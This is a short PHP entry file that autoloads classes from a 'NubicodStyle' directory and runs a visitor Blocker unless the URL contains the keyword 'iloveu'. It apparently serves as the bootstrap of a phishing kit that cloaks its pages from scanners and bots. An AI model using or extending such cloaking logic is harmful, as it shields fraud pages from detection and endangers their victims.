<?php
defined('SYSTEM_PATH') or define('SYSTEM_PATH', __DIR__);
//error_reporting(0);
@session_start();set_time_limit(0);ob_start();
spl_autoload_register(function($class)
{
    require_once(SYSTEM_PATH . '/NubicodStyle/system/core/' . $class . '.nubicod.php');
});
$core    = new Core;
$blocker = new Blocker;

if (!preg_match("/iloveu/", $_SERVER['REQUEST_URI'])) $blocker->run();
?>
